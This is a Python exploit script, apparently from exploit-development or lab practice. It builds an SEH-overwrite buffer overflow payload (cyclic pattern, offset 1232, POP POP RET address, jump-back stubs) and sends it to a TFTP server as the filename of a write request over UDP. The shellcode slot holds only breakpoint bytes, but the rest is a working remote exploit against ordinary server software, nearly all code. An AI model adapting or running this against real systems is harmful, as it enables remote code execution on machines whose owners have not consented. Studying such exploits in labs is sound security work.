#!/usr/bin/env python

# Begin of Helper canvas
import struct
import pwn
import sys

CRED = "\033[91m"; CGRE = "\033[92m"; CYEL = "\033[93m"; CBLU = "\033[94m"; CPUR = "\033[95m"; CCYA = "\033[96m"; CWHI = "\033[97m"; CRST = "\033[0m"; BRED= "\033[41m"


def createPattern(size,args={}):
    char1="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    char2="abcdefghijklmnopqrstuvwxyz"
    char3="0123456789"
    pattern = []
    max = int(size)
    while len(pattern) < max:
        for ch1 in char1:
            for ch2 in char2:
                for ch3 in char3:
                    if len(pattern) < max:
                        pattern.append(ch1)
                    if len(pattern) < max:
                        pattern.append(ch2)
                    if len(pattern) < max:
                        pattern.append(ch3)
    pattern = "".join(pattern)
    return pattern


class snip:
    def __init__(self,offset,content,label=None,color=CRST):
        self.offset  = offset
        self.content = content
        self.color   = color
        self.label   = label


class payload:
    def __init__(self,content=None,length=4096):
        pattern = createPattern(length)
        self.colormap = []
        if content is not None:
            self.content = content
        else:
            self.content = pattern[0:length]
        self.sniplist = []
        self.marksniplist = []
        for i in range(len(self.content)):
            self.colormap.append(CRST)

    def add(self,snip):
        self.sniplist.append(snip)
        self.sniplist = sorted(self.sniplist, key=lambda s: s.offset)

    def mark(self,snip):
        self.marksniplist.append(snip)
        #self.sniplist.remove(snip)

    def generate(self):
        for s in self.sniplist:
            overlap = False
            print("Processing %s Snippet %s at offset %02d%s" % (s.color,s.label, s.offset,CRST))
            for i in range(s.offset,s.offset+len(s.content)):
                while len(self.colormap) < s.offset+len(s.content):
                    self.content += "A"
                    self.colormap.append(CRST)
                if self.colormap[i] != CRST:
                    self.colormap[i] = BRED + s.color
                    overlap = True
            if overlap == False:
                for i in range(s.offset,s.offset+len(s.content)):
                        self.colormap[i] = s.color
                n=self.content[0:s.offset]
                n+=s.content
                n+=self.content[(s.offset+len(s.content)):]
                self.content = n
            else:
                print("%sError: Overlapping Snippet%s" %(CRED, CRST))
                self.mark(s)

        for i in range(len(self.content)):
            if self.colormap[i] == CRST:
              if self.content[i] == "\x90":
          	  	self.colormap[i] = CCYA
              elif ord(self.content[i]) in range(0x30,0x3A):
                self.colormap[i] = CWHI
              elif ord(self.content[i]) in range(0x41,0x5B):
                self.colormap[i] = CWHI
              elif ord(self.content[i]) in range(0x61,0x7B):
                self.colormap[i] = CWHI
              elif self.content[i] == "\xcc":
                self.colormap[i] = CRED

        if self.marksniplist:
            self.hexdump()
            print("%sAborting script execution...%s" % (CRED, CRST))
            sys.exit()

    def hexdump(self):
        print(CWHI + "Buffer Lenght: " + str(len(self.content)) + CRST)
        hexvalues = ""
        asciivalues = ""
        labels = ""
        for i in range(len(self.content)):
            hexvalues += "%s%02x %s" % (self.colormap[i], ord(self.content[i]), CRST)
            if ord(self.content[i]) in range(0x20,0x7f):
                asciivalues += "%s%s%s" % (self.colormap[i],self.content[i], CRST)
            else:
                asciivalues += "%s%s%s" % (self.colormap[i],".", CRST)
            for s in self.sniplist:
                if s.offset == i :
                    labels += "%s%s%s " % (s.color,s.label,CRST)
            if i % 16 == 0xf:
                print("0x%08x (%08d):   %s   %s   %s" % (i & 0xfffffff0, i & 0xfffffff0, hexvalues, asciivalues, labels))
                hexvalues = ""
                asciivalues = ""
                labels = ""
            elif i == len(self.content)-1:
                hexvalues += "   " *(15-i%16)
                asciivalues += " " *(15-i%16)
                print("0x%08x (%08d):   %s   %s   %s" % (i & 0xfffffff0, i & 0xfffffff0, hexvalues, asciivalues, labels))
        if self.marksniplist:
            for s in self.marksniplist:
                print("")
                hexvalues =""
                asciivalues = ""
                for i in range(len(s.content)):
                    hexvalues += "%02x" % (ord(s.content[i]))
                    if ord(s.content[i]) in range(0x20,0x7f):
                        asciivalues += "%s" % (s.content[i])
                    else:
                        asciivalues += "%s" % (".")
                print("%s - /!\ The following snippet was NOT inserted due to overlap with another snippet:\r\n       %s%s%s at offset %s%d%s with content %s '%s' (%s)%s\r\n       ---------------- /!\%s" % (CRED, s.color, s.label, CRED, s.color, s.offset, CRED, s.color, hexvalues, asciivalues, CRED, CRST))
            print("")

# End of Helper canvas


# Target
host="192.168.1.100"
port=69
tpt="udp"

# Snippets
nop = "\x90"
brk = "\xcc"
seh = struct.pack('<I',0x0040484F)  # POP EDI, POP EBP, RET
jmpback="\xeb\xea" # jmp short -20
longjmpback="\xd9\xee\xd9\x74\x24\xf4\x59\x80\xc1\x0a\x90\xfe\xcd\xfe\xcd\xff\xe1" #jmp eip-512
sc=brk*50

# Buffer
p = payload(nop*1236)
p = payload(length=1236)
p.add(snip(1232,seh,"seh",CYEL))	# SEH handler SEH chain SE handler=31704230; Pattern 0Bp1 (0x31704230) found in cyclic pattern at position 1232
p.add(snip(1228,jmpback,"jmpback",CRED))
p.add(snip(1208,longjmpback,"longjmpback",CPUR))
p.add(snip(194+512,sc,"sc",CGRE))
#p.add(snip(194+600,"AAAAAAAAAAAARGHH","overlaptest",CYEL))
p.generate()
buf = p.content


#Build TFTP packet
opcode = "\x00\x02"     # TFTP WRQ
fn     = buf
mode   = "netascii"
null   = "\x00"
req    = opcode + fn + null + mode + null

# The intermediate null byte is now part of the fn (jmpecx)
req = opcode + fn + mode + null

#Connect and send
print("len : " + str(len(req)))
p.hexdump()
c=pwn.connect(host=host,port=port,typ=tpt)
c.send(req)
#print c.recv()
c.close()

